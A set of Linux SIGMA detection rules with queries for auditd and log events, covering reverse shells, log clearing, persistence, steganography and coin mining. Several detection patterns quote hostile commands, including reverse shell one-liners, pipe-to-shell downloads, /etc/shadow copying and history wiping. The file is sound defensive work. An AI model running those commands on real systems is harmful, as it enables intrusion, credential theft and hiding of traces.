name: SIGMA - Audio Capture
author: Pawel Mazur, Milad Cheraghi
description: Detects attempts to record audio using the arecord and ecasound utilities.
query: any where (type:"EXECVE" and a0:"arecord" and a1:"-vv" and a2:"-fdat") or (type:"SYSCALL" and exe:"*/ecasound" and syscall:"memfd_create")

name: SIGMA - Auditing Configuration Changes on Linux Host
author: Mikhail Larin, oscd.community
description: Detect changes in auditd configuration files
query: any where type:"PATH" and (name like~ ("/etc/audit/*", "/etc/libaudit.conf", "/etc/audisp/*"))

name: SIGMA - Binary Padding - Linux
author: Igor Fits, oscd.community
description:
Adversaries may use binary padding to add junk data and change the on-disk representation of malware.
This rule detect using dd and truncate to add a junk data to file.
query: any where type:"EXECVE" and (("truncate" and "-s") or (("dd" and "if=") and (not "of=")))

name: SIGMA - BPFDoor Abnormal Process ID or Lock File Accessed
author: Rafal Piasecki
description: detects BPFDoor .lock and .pid files access in temporary file storage facility
query: any where type:"PATH" and (name like~ ("/var/run/haldrund.pid", "/var/run/xinetd.lock", "/var/run/kdevrund.pid"))

name: SIGMA - Bpfdoor TCP Ports Redirect
author: Rafal Piasecki
description:
All TCP traffic on particular port from attacker is routed to different port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22 -j REDIRECT --to-ports 42392'
The traffic looks like encrypted SSH communications going to TCP port 22, but in reality is being directed to the shell port once it hits the iptables rule for the attacker host only.
query: any where (type:"EXECVE" and a0:"*iptables" and a1:"-t" and a2:"nat") and ("--to-ports 42" or "--to-ports 43")

name: SIGMA - Linux Capabilities Discovery
author: Pawel Mazur
description: Detects attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.
query: any where type:"EXECVE" and a0:"getcap" and a1:"-r" and a2:"/"

name: SIGMA - File Time Attribute Change - Linux
author: Igor Fits, oscd.community
description: Detect file time attribute change to hide new or changes to existing files.
query: any where type:"EXECVE" and "touch" and ("-t" or "-acmr" or "-d" or "-r")

name: SIGMA - Remove Immutable File Attribute - Auditd
author: Jakob Weinzettl, oscd.community
description: Detects removing immutable file attribute.
false_positives: Administrator interacting with immutable files (e.g. for instance backups).

subtechnique.name: Linux and Mac File and Directory Permissions Modification

query: any where type:"EXECVE" and a0:"*chattr*" and a1:"*-i*"

name: SIGMA - Clear or Disable Kernel Ring Buffer Logs via Syslog Syscall
author: Milad Cheraghi
description:
Detects the use of the `syslog` syscall with action code 5 (SYSLOG_ACTION_CLEAR),
(4 is SYSLOG_ACTION_READ_CLEAR and 6 is SYSLOG_ACTION_CONSOLE_OFF) which clears the kernel
ring buffer (dmesg logs). This can be used by attackers to hide traces after exploitation
or privilege escalation. A common technique is running `dmesg -c`, which triggers this syscall internally.
false_positives: System administrators or scripts that intentionally clear logs

subtechnique.name: Clear Linux or Mac System Logs

query: any where type:"SYSCALL" and syscall:"syslog" and (a0 like~ (4, 5, 6))

name: SIGMA - Clipboard Collection with Xclip Tool - Auditd
author: Pawel Mazur
description:
Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool.
Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.
query: any where type:"EXECVE" and a0:"xclip" and (a1 like~ ("-selection", "-sel")) and (a2 like~ ("clipboard", "clip")) and a3:"-o"

name: SIGMA - Clipboard Collection of Image Data with Xclip Tool
author: Pawel Mazur
description:
Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool.
Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.
query: any where type:"EXECVE" and a0:"xclip" and (a1 like~ ("-selection", "-sel")) and (a2 like~ ("clipboard", "clip")) and a3:"-t" and a4:"image/*" and a5:"-o"

name: SIGMA - Possible Coin Miner CPU Priority Param
author: Florian Roth (Nextron Systems)
description: Detects command line parameter very often used with coin miners
false_positives: Other tools that use a --cpu-priority flag
query: any where a1:"--cpu-priority*" or a2:"--cpu-priority*" or a3:"--cpu-priority*" or a4:"--cpu-priority*" or a5:"--cpu-priority*" or a6:"--cpu-priority*" or a7:"--cpu-priority*"

name: SIGMA - Creation Of An User Account
author: Marie Euler, Pawel Mazur
description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.
query: any where (type:"SYSCALL" and exe:"*/useradd") or type:"ADD_USER"

name: SIGMA - Data Compressed
author: Timur Zinniatullin, oscd.community
description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.
false_positives: Legitimate use of archiving tools by legitimate user.
query: any where (type:"execve" and a0:"zip") or (type:"execve" and a0:"gzip" and a1:"-k") or (type:"execve" and a0:"tar" and a1:"*-c*")

name: SIGMA - Data Exfiltration with Wget
author: Pawel Mazur
description:
Detects attempts to post the file with the usage of wget utility.
The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.
false_positives: Legitimate usage of wget utility to post a file
query: any where type:"EXECVE" and a0:"wget" and a1:"--post-file=*"

name: SIGMA - Overwriting the File with Dev Zero or Null
author: Jakob Weinzettl, oscd.community
description: Detects overwriting (effectively wiping/deleting) of a file.
query: any where type:"EXECVE" and a0:"*dd*" and (a1 like~ ("*if=/dev/null*", "*if=/dev/zero*"))

name: SIGMA - Disable ASLR Via Personality Syscall - Linux
author: Milad Cheraghi
description:
Detects the use of the `personality` syscall with the ADDR_NO_RANDOMIZE flag (0x0040000),
which disables Address Space Layout Randomization (ASLR) in Linux. This is often used by attackers
exploit development, or to bypass memory protection mechanisms.
A successful use of this flag can reduce the effectiveness of ASLR and make memory corruption
attacks more reliable.
query: any where type:"SYSCALL" and syscall:"personality" and a0:40000

name: SIGMA - Disable System Firewall
author: Pawel Mazur
description: Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.
query: any where type:"SERVICE_STOP" and (unit like~ ("firewalld", "iptables", "ufw"))

name: SIGMA - File or Folder Permissions Change
author: Jakob Weinzettl, oscd.community
description: Detects file and folder permission changes.
false_positives: User interacting with files permissions (normal/daily behaviour).

subtechnique.name: Linux and Mac File and Directory Permissions Modification

query: any where type:"EXECVE" and (a0 like~ ("*chmod*", "*chown*"))

name: SIGMA - Credentials In Files - Linux
author: Igor Fits, oscd.community
description: Detecting attempts to extract passwords with grep
query: any where type:"EXECVE" and ("grep" and "password")

name: SIGMA - Use Of Hidden Paths Or Files
author: David Burkett, @signalblur
description: Detects calls to hidden files or files located in hidden directories in NIX systems.
query: any where (type:"PATH" and name:"*/.*") and (not (name like~ ("*/.cache/*", "*/.config/*", "*/.pyenv/*", "*/.rustup/toolchains*")))

name: SIGMA - Hidden Files and Directories
author: Pawel Mazur
description: Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character
query: any where (type:"EXECVE" and (a0 like~ ("mkdir", "nano", "touch", "vi", "vim"))) and (a1 regex~ "(^|\\/)\.[^.\\/]" or a2 regex~ "(^|\\/)\.[^.\\/]")

name: SIGMA - Steganography Hide Zip Information in Picture File
author: Pawel Mazur
description: Detects appending of zip file to image
query: any where (type:"EXECVE" and a0:"cat") and (a1 like~ ("*.jpg", "*.png")) and a2:"*.zip"

name: SIGMA - Linux Keylogging with Pam.d
author: Pawel Mazur
description: Detect attempt to enable auditing of TTY input
query: any where (type:"PATH" and (name like~ ("/etc/pam.d/system-auth", "/etc/pam.d/password-auth"))) or (type like~ ("TTY", "USER_TTY"))

name: SIGMA - Modification of ld.so.preload
author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community
description: Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.
query: any where type:"PATH" and name:"/etc/ld.so.preload"

name: SIGMA - Loading of Kernel Module via Insmod
author: Pawel Mazur
description:
Detects loading of kernel modules with insmod command.
Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.
Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.
query: any where type:"SYSCALL" and comm:"insmod" and exe:"/usr/bin/kmod"

name: SIGMA - Logging Configuration Changes on Linux Host
author: Mikhail Larin, oscd.community
description: Detect changes of syslog daemons configuration files
query: any where type:"PATH" and (name like~ ("/etc/syslog.conf", "/etc/rsyslog.conf", "/etc/syslog-ng/syslog-ng.conf"))

name: SIGMA - Potential Abuse of Linux Magic System Request Key
author: Milad Cheraghi
description:
Detects the potential abuse of the Linux Magic SysRq (System Request) key by adversaries with root or sufficient privileges
to silently manipulate or destabilize a system. By writing to /proc/sysrq-trigger, they can crash the system, kill processes,
or disrupt forensic analysis—all while bypassing standard logging. Though intended for recovery and debugging, SysRq can be
misused as a stealthy post-exploitation tool. It is controlled via /proc/sys/kernel/sysrq or permanently through /etc/sysctl.conf.
query: any where type:"PATH" and (name like~ ("*/sysrq", "*/sysctl.conf", "*/sysrq-trigger"))

name: SIGMA - Masquerading as Linux Crond Process
author: Timur Zinniatullin, oscd.community
description:
Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.
Several different variations of this technique have been observed.
query: any where type:"execve" and a0:"cp" and a1:"/bin/sh" and a2:"*/crond"

name: SIGMA - Modify System Firewall
author: IAI
description:
Detects the removal of system firewall rules. Adversaries may only delete or modify a specific system firewall rule to bypass controls limiting network usage or access.
Detection rules that match only on the disabling of firewalls will miss this.
query: any where (type:"EXECVE" and a0:"iptables" and a1:"*DROP*") or (type:"EXECVE" and a0:"firewall-cmd" and a1:"*remove*") or (type:"EXECVE" and a0:"ufw" and a1:"*delete*") or (type:"EXECVE" and a0:"nft" and (a1 like~ ("*delete*", "*flush*")))

name: SIGMA - Linux Network Service Scanning - Auditd
author: Alejandro Ortuno, oscd.community
description: Detects enumeration of local or remote network services.
query: any where type:"SYSCALL" and (exe like~ ("*/telnet", "*/nmap", "*/netcat", "*/nc", "*/ncat", "*/nc.openbsd")) and key:"network_connect_4"

name: SIGMA - Network Sniffing - Linux
author: Timur Zinniatullin, oscd.community
description:
Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.
An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.
false_positives: Legitimate administrator or user uses network sniffing tool for legitimate reasons.
query: any where (type:"execve" and a0:"tcpdump" and a1:"-c" and a3:"*-i*") or (type:"execve" and a0:"tshark" and a1:"-c" and a3:"-i")

name: SIGMA - Password Policy Discovery - Linux
author: Ömer Günal, oscd.community, Pawel Mazur
description: Detects password policy discovery commands
query: any where (type:"PATH" and (name like~ ("/etc/login.defs", "/etc/pam.d/auth", "/etc/pam.d/common-account", "/etc/pam.d/common-auth", "/etc/pam.d/common-password", "/etc/pam.d/system-auth", "/etc/security/pwquality.conf"))) or (type:"EXECVE" and a0:"chage" and (a1 like~ ("--list", "-l"))) or (type:"EXECVE" and a0:"passwd" and (a1 like~ ("-S", "--status")))

name: SIGMA - Screen Capture with Import Tool
author: Pawel Mazur
description:
Detects adversary creating screen capture of a desktop with Import Tool.
Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations.
ImageMagick must be installed.
query: any where (type:"EXECVE" and a0:"import") and ((a1:"-window" and a2:"root" and (a3 like~ ("*.png", "*.jpg", "*.jpeg"))) or (a1 like~ ("*.png", "*.jpg", "*.jpeg")))

name: SIGMA - Screen Capture with Xwd
author: Pawel Mazur
description: Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations
query: any where (type:"EXECVE" and a0:"xwd") and ((a1:"-root" and a2:"-out" and a3:"*.xwd") or (a1:"-out" and a2:"*.xwd"))

name: SIGMA - Split A File Into Pieces - Linux
author: Igor Fits, oscd.community
description: Detection use of the command "split" to split files into parts and possible transfer.
query: any where type:"SYSCALL" and comm:"split"

name: SIGMA - Steganography Hide Files with Steghide
author: Pawel Mazur
description: Detects embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.
query: any where type:"EXECVE" and a0:"steghide" and a1:"embed" and (a2 like~ ("-cf", "-ef")) and (a4 like~ ("-cf", "-ef"))

name: SIGMA - Steganography Extract Files with Steghide
author: Pawel Mazur
description: Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.
query: any where type:"EXECVE" and a0:"steghide" and a1:"extract" and a2:"-sf" and (a3 like~ ("*.jpg", "*.png"))

name: SIGMA - Suspicious C2 Activities
author: Marie Euler
description:
Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'.
This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.
These commands match a few techniques from the tactics "Command and Control", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)
query: any where key:"susp_activity"

name: SIGMA - Suspicious Commands Linux
author: Florian Roth (Nextron Systems)
description: Detects relevant commands often related to malware or hacking activity
references: Internal Research - mostly derived from exploit code including code in MSF
query: any where (type:"EXECVE" and a0:"chmod" and a1:777) or (type:"EXECVE" and a0:"chmod" and a1:"u+s") or (type:"EXECVE" and a0:"cp" and a1:"/bin/ksh") or (type:"EXECVE" and a0:"cp" and a1:"/bin/sh")

name: SIGMA - System Info Discovery via Sysinfo Syscall
author: Milad Cheraghi
description:
Detects use of the sysinfo system call in Linux, which provides a snapshot of key system statistics such as uptime, load averages, memory usage, and the number of running processes.
Malware or reconnaissance tools might leverage sysinfo to fingerprint the system - gathering data to determine if it's a viable target.
query: any where (type:"SYSCALL" and syscall:"sysinfo") and (not exe:"*/bin/splunkd")

name: SIGMA - Program Executions in Suspicious Folders
author: Florian Roth (Nextron Systems)
description: Detects program executions in suspicious non-program folders related to malware or hacking activity
query: any where type:"SYSCALL" and (exe like~ ("/tmp/*", "/var/www/*", "/home/*/public_html/*", "/usr/local/apache2/*", "/usr/local/httpd/*", "/var/apache/*", "/srv/www/*", "/home/httpd/html/*", "/srv/http/*", "/usr/share/nginx/html/*", "/var/lib/pgsql/data/*", "/usr/local/mysql/data/*", "/var/lib/mysql/*", "/var/vsftpd/*", "/etc/bind/*", "/var/named/*"))

name: SIGMA - Suspicious History File Operations - Linux
author: Mikhail Larin, oscd.community
description: Detects commandline operations on shell history files
query: any where type:"EXECVE" and (".bash_history" or ".zsh_history" or ".zhistory" or ".history" or ".sh_history" or "fish_history")

name: SIGMA - Service Reload or Start - Linux
author: Jakob Weinzettl, oscd.community, CheraghiMilad
description: Detects the start, reload or restart of a service.
query: any where type:"EXECVE" and (a0 like~ ("*systemctl*", "*service*")) and (a1 like~ ("*reload*", "*start*"))

name: SIGMA - Special File Creation via Mknod Syscall
author: Milad Cheraghi
description:
Detects usage of the `mknod` syscall to create special files (e.g., character or block devices).
Attackers or malware might use `mknod` to create fake devices, interact with kernel interfaces,
or establish covert channels in Linux systems.
Monitoring the use of `mknod` is important because this syscall is rarely used by legitimate applications,
and it can be abused to bypass file system restrictions or create backdoors.
false_positives: Device creation by legitimate scripts or init systems (udevadm, MAKEDEV)
Container runtimes or security tools during initialization
query: any where type:"SYSCALL" and syscall:"mknod"

name: SIGMA - Systemd Service Creation
author: Pawel Mazur
description: Detects a creation of systemd services which could be used by adversaries to execute malicious code.
false_positives: Admin work like legit service installs.
query: any where (type:"PATH" and nametype:"CREATE") and ((name like~ ("/usr/lib/systemd/system/*", "/etc/systemd/system/*")) or name:"*/.config/systemd/user/*")

name: SIGMA - System Information Discovery - Auditd
author: Pawel Mazur
description: Detects System Information Discovery commands
query: any where (type:"PATH" and (name like~ ("/etc/lsb-release", "/etc/redhat-release", "/etc/issue"))) or (type:"EXECVE" and (a0 like~ ("uname", "uptime", "lsmod", "hostname", "env"))) or (type:"EXECVE" and a0:"grep" and (a1 like~ ("*vbox*", "*vm*", "*xen*", "*virtio*", "*hv*"))) or (type:"EXECVE" and a0:"kmod" and a1:"list")

name: SIGMA - System and Hardware Information Discovery
author: Ömer Günal, oscd.community
description: Detects system information discovery commands
query: any where type:"PATH" and (name like~ ("/sys/class/dmi/id/bios_version", "/sys/class/dmi/id/product_name", "/sys/class/dmi/id/chassis_vendor", "/proc/scsi/scsi", "/proc/ide/hd0/model", "/proc/version", "/etc/*version", "/etc/*release", "/etc/issue"))

name: SIGMA - System Shutdown/Reboot - Linux
author: Igor Fits, oscd.community
description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.
query: any where type:"EXECVE" and (("shutdown" or "reboot" or "halt" or "poweroff") or (("init" or "telinit") and (0 or 6)))

name: SIGMA - Unix Shell Configuration Modification
author: Peter Matkovski, IAI
description: Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.
false_positives: Admin or User activity are expected to generate some false positives
query: any where type:"PATH" and (name like~ ("/etc/shells", "/etc/profile", "/etc/profile.d/*", "/etc/bash.bashrc", "/etc/bashrc", "/etc/zsh/zprofile", "/etc/zsh/zshrc", "/etc/zsh/zlogin", "/etc/zsh/zlogout", "/etc/csh.cshrc", "/etc/csh.login", "/root/.bashrc", "/root/.bash_profile", "/root/.profile", "/root/.zshrc", "/root/.zprofile", "/home/*/.bashrc", "/home/*/.zshrc", "/home/*/.bash_profile", "/home/*/.zprofile", "/home/*/.profile", "/home/*/.bash_login", "/home/*/.bash_logout", "/home/*/.zlogin", "/home/*/.zlogout"))

name: SIGMA - Steganography Unzip Hidden Information From Picture File
author: Pawel Mazur
description: Detects extracting of zip file from image file
query: any where (type:"EXECVE" and a0:"unzip") and (a1 like~ ("*.jpg", "*.png"))

name: SIGMA - System Owner or User Discovery - Linux
author: Timur Zinniatullin, oscd.community
description:
Detects the execution of host or user discovery utilities such as "whoami", "hostname", "id", etc.
Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
query: any where type:"EXECVE" and (a0 like~ ("hostname", "id", "last", "uname", "users", "w", "who", "whoami"))

name: SIGMA - Webshell Remote Command Execution
author: Ilyas Ochkov, Beyu Denis, oscd.community
description: Detects possible command execution by web application/web shell
query: any where type:"SYSCALL" and (syscall like~ ("execve", "execveat")) and euid:33

name: SIGMA - Equation Group Indicators
author: Florian Roth (Nextron Systems)
description: Detects suspicious shell commands used in various Equation Group scripts and tools
query: any where "chown root*chmod 4777 " or "cp /bin/sh .;chown" or "chmod 4777 /tmp/.scsi/dev/bin/gsh" or "chown root:root /tmp/.scsi/dev/bin/" or "chown root:root x;" or "/bin/telnet locip locport < /dev/console | /bin/sh" or "/tmp/ratload" or "ewok -t " or "xspy -display " or "cat > /dev/tcp/127.0.0.1/80 <<END" or "rm -f /current/tmp/ftshell.latest" or "ghost_* -v " or " --wipe > /dev/null" or "ping -c 2 *; grep * /proc/net/arp >/tmp/gx" or "iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;" or "> /var/log/audit/audit.log; rm -f ." or "cp /var/log/audit/audit.log .tmp" or "sh >/dev/tcp/* <&1 2>&1" or "ncat -vv -l -p * <" or "nc -vv -l -p * <" or "< /dev/console | uudecode && uncompress" or "sendmail -osendmail;chmod +x sendmail" or "/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron" or "chmod 666 /var/run/utmp~" or "chmod 700 nscd crond" or "cp /etc/shadow /tmp/." or "</dev/console |uudecode > /dev/null 2>&1 && uncompress" or "chmod 700 jp&&netstat -an|grep" or "uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755" or "chmod 700 crond" or "wget http*; chmod +x /tmp/sendmail" or "chmod 700 fp sendmail pt" or "chmod 755 /usr/vmsys/bin/pipe" or "chmod -R 755 /usr/vmsys" or "chmod 755 $opbin/*tunnel" or "chmod 700 sendmail" or "chmod 0700 sendmail" or "/usr/bin/wget http*sendmail;chmod +x sendmail;" or "&& telnet * 2>&1 </dev/console"

name: SIGMA - Buffer Overflow Attempts
author: Florian Roth (Nextron Systems)
description: Detects buffer overflow attempts in Unix system log files
false_positives: Base64 encoded data in log entries
query: any where "attempt to execute code on stack by" or "0bin0sh1" or "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" or "stack smashing detected"

name: SIGMA - Commands to Clear or Remove the Syslog - Builtin
author: Max Altgelt (Nextron Systems)
description: Detects specific commands commonly used to remove or empty the syslog
query: any where ("rm /var/log/syslog" or "rm -r /var/log/syslog" or "rm -f /var/log/syslog" or "rm -rf /var/log/syslog" or "mv /var/log/syslog" or " >/var/log/syslog" or " > /var/log/syslog") and (not "/syslog.")

name: SIGMA - Remote File Copy
author: Ömer Günal
description: Detects the use of tools that copy files from or to remote systems
query: any where ("scp " or "rsync " or "sftp ") and ("@" or ":")

name: SIGMA - Code Injection by ld.so Preload
author: Christian Burkard (Nextron Systems)
description: Detects the ld.so preload persistence file. See `man ld.so` for more information.
false_positives: Rare temporary workaround for library misconfiguration
query: any where "/etc/ld.so.preload"

name: SIGMA - Nimbuspwn Exploitation
author: Bhabesh Raj
description: Detects exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800)
query: any where "networkd-dispatcher" and "Error handling notification for interface" and "../../"

name: SIGMA - Potential Suspicious BPF Activity - Linux
author: Red Canary (idea), Nasreddine Bencherchali
description: Detects the presence of "bpf_probe_write_user" BPF helper-generated warning messages. Which could be a sign of suspicious eBPF activity on the system.
query: any where "bpf_probe_write_user"

name: SIGMA - Privileged User Has Been Created
author: Pawel Mazur
description: Detects the addition of a new user to a privileged group such as "root" or "sudo"
query: any where "new user" and ("GID=0," or "UID=0," or "GID=10," or "GID=27,")

name: SIGMA - Shellshock Expression
author: Florian Roth (Nextron Systems)
description: Detects shellshock expressions in log files

name: SIGMA - Linux Command History Tampering
author: Patrick Bareiss
description:
Detects commands that try to clear or tamper with the Linux command history.
This technique is used by threat actors in order to evade defenses and execute commands without them being recorded in files such as "bash_history" or "zsh_history".
query: any where "cat /dev/null >*sh_history" or "cat /dev/zero >*sh_history" or "chattr +i*sh_history" or "echo \"\" >*sh_history" or "empty_bash_history" or "export HISTFILESIZE=0" or "history -c" or "history -w" or "ln -sf /dev/null *sh_history" or "ln -sf /dev/zero *sh_history" or "rm *sh_history" or "shopt -ou history" or "shopt -uo history" or "shred *sh_history" or "truncate -s0 *sh_history"

name: SIGMA - Suspicious Activity in Shell Commands
author: Florian Roth (Nextron Systems)
description: Detects suspicious shell commands used in various exploit codes (see references)
query: any where "wget * - http* | perl" or "wget * - http* | sh" or "wget * - http* | bash" or "python -m SimpleHTTPServer" or "-m http.server" or "import pty; pty.spawn*" or "socat exec:*" or "socat -O /tmp/*" or "socat tcp-connect*" or "*echo binary >>*" or "*wget *; chmod +x*" or "*wget *; chmod 777 *" or "*cd /tmp || cd /var/run || cd /mnt*" or "*stop;service iptables stop;*" or "*stop;SuSEfirewall2 stop;*" or "chmod 777 2020*" or "*>>/etc/rc.local" or "*base64 -d /tmp/*" or "* | base64 -d *" or "*/chmod u+s *" or "*chmod +s /tmp/*" or "*chmod u+s /tmp/*" or "* /tmp/haxhax*" or "* /tmp/ns_sploit*" or "nc -l -p *" or "cp /bin/ksh *" or "cp /bin/sh *" or "* /tmp/*.b64 *" or "*/tmp/ysocereal.jar*" or "*/tmp/x *" or "*; chmod +x /tmp/*" or "*;chmod +x /tmp/*"

name: SIGMA - Suspicious Log Entries
author: Florian Roth (Nextron Systems)
description: Detects suspicious log entries in Linux log files
query: any where "entered promiscuous mode" or "Deactivating service" or "Oversized packet received from" or "imuxsock begins to drop messages"

name: SIGMA - Suspicious Reverse Shell Command Line
author: Florian Roth (Nextron Systems)
description: Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell
query: any where "BEGIN {s = \"/inet/tcp/0/" or "bash -i >& /dev/tcp/" or "bash -i >& /dev/udp/" or "sh -i >$ /dev/udp/" or "sh -i >$ /dev/tcp/" or "&& while read line 0<&5; do" or "/bin/bash -c exec 5<>/dev/tcp/" or "/bin/bash -c exec 5<>/dev/udp/" or "nc -e /bin/sh " or "/bin/sh | nc" or "rm -f backpipe; mknod /tmp/backpipe p && nc " or ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))" or ";STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;" or "/bin/sh -i <&3 >&3 2>&3" or "uname -a; w; id; /bin/bash -i" or "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};" or ";os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');" or ".to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)" or ";while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print" or "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" or "rm -f /tmp/p; mknod /tmp/p p &&" or " | /bin/bash | telnet " or ",echo=0,raw tcp-listen:" or "nc -lvvp " or "xterm -display 1"

name: SIGMA - Space After Filename
author: Ömer Günal
description: Detects space after filename
query: any where "echo \"*\" > * && chmod +x *" and "mv * \"* \""

name: SIGMA - Suspicious Use of /dev/tcp
author: frack113
description: Detects suspicious command with /dev/tcp
query: any where "cat </dev/tcp/" or "exec 3<>/dev/tcp/" or "echo >/dev/tcp/" or "bash -i >& /dev/tcp/" or "sh -i >& /dev/udp/" or "0<&196;exec 196<>/dev/tcp/" or "exec 5<>/dev/tcp/" or "(sh)0>/dev/tcp/" or "bash -c 'bash -i >& /dev/tcp/" or "echo -e '#!/bin/bash\\nbash -i >& /dev/tcp/"

name: SIGMA - JexBoss Command Sequence
author: Florian Roth (Nextron Systems)
description: Detects suspicious command sequence that JexBoss
query: any where "bash -c /bin/bash" and "&/dev/tcp/"

name: SIGMA - Symlink Etc Passwd
author: Florian Roth (Nextron Systems)
description: Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd
query: any where "ln -s -f /etc/passwd" or "ln -s /etc/passwd"

name: SIGMA - Linux Doas Conf File Creation
author: Sittikorn S, Teoderick Contreras
description: Detects the creation of doas.conf file in linux host platform.
query: any where TargetFilename:"*/etc/doas.conf"

name: SIGMA - Persistence Via Cron Files
author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
description: Detects creation of cron file or files in Cron directories which could indicates potential persistence.
query: any where (TargetFilename like~ ("/etc/cron.d/*", "/etc/cron.daily/*", "/etc/cron.hourly/*", "/etc/cron.monthly/*", "/etc/cron.weekly/*", "/var/spool/cron/crontabs/*")) or (TargetFilename like~ ("*/etc/cron.allow*", "*/etc/cron.deny*", "*/etc/crontab*"))

name: SIGMA - Persistence Via Sudoers Files
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects creation of sudoers file or files in "sudoers.d" directory which can be used a potential method to persiste privileges for a specific user.
false_positives: Creation of legitimate files in sudoers.d folder part of administrator work
query: any where TargetFilename:"/etc/sudoers.d/*"

name: SIGMA - Potentially Suspicious Shell Script Creation in Profile Folder
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects the creation of shell scripts under the "profile.d" path.
false_positives: Legitimate shell scripts in the "profile.d" directory could be common in your environment. Apply additional filter accordingly via "image", by adding specific filenames you "trust" or by correlating it with other events.
Regular file creation during system update or software installation by the package manager
query: any where TargetFilename:"*/etc/profile.d/*" and (TargetFilename like~ ("*.csh", "*.sh"))

name: SIGMA - Triple Cross eBPF Rootkit Default LockFile
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects the creation of the file "rootlog" which is used by the TripleCross rootkit as a way to check if the backdoor is already running.
query: any where TargetFilename:"/tmp/rootlog"

name: SIGMA - Triple Cross eBPF Rootkit Default Persistence
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d" directories. Which both are related to the TripleCross persistence method
query: any where TargetFilename:"*ebpfbackdoor"

name: SIGMA - Wget Creating Files in Tmp Directory
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects the use of wget to download content in a temporary directory such as "/tmp" or "/var/tmp"
false_positives: Legitimate downloads of files in the tmp folder.
query: any where Image:"*/wget" and (TargetFilename like~ ("/tmp/*", "/var/tmp/*"))

name: SIGMA - Linux Reverse Shell Indicator
author: Florian Roth (Nextron Systems)
description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
query: any where Image:"*/bin/bash" and (not (DestinationIp like~ ("127.0.0.1", "0.0.0.0")))

name: SIGMA - Linux Crypto Mining Pool Connections
author: Florian Roth (Nextron Systems)
description: Detects process connections to a Monero crypto mining pool
query: any where DestinationHostname like~ ("pool.minexmr.com", "fr.minexmr.com", "de.minexmr.com", "sg.minexmr.com", "ca.minexmr.com", "us-west.minexmr.com", "pool.supportxmr.com", "mine.c3pool.com", "xmr-eu1.nanopool.org", "xmr-eu2.nanopool.org", "xmr-us-east1.nanopool.org", "xmr-us-west1.nanopool.org", "xmr-asia1.nanopool.org", "xmr-jp1.nanopool.org", "xmr-au1.nanopool.org", "xmr.2miners.com", "xmr.hashcity.org", "xmr.f2pool.com", "xmrpool.eu", "pool.hashvault.pro", "moneroocean.stream", "monerocean.stream")

name: SIGMA - Communication To LocaltoNet Tunneling Service Initiated - Linux
author: Andreas Braathen (mnemonic.io)
description:
Detects an executable initiating a network connection to "LocaltoNet" tunneling sub-domains.
LocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.
Attackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.
false_positives: Legitimate use of the LocaltoNet service.
